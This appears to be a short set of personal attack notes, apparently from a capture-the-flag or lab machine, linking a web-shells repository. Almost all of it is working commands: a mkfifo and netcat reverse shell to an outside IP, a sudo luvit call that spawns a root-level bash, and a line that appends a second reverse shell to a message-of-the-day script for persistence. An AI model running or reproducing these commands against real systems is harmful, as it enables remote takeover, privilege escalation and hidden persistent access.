https://github.com/TheBinitGhimire/Web-Shells

### Not necessary to write a lua script

```
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|sh -i 2>&1|nc 10.10.16.6 4243 >/tmp/y

sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash")'

echo "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|sh -i 2>&1|nc 10.10.16.6 4244 >/tmp/g" >> /etc/update-motd.d/00-header
```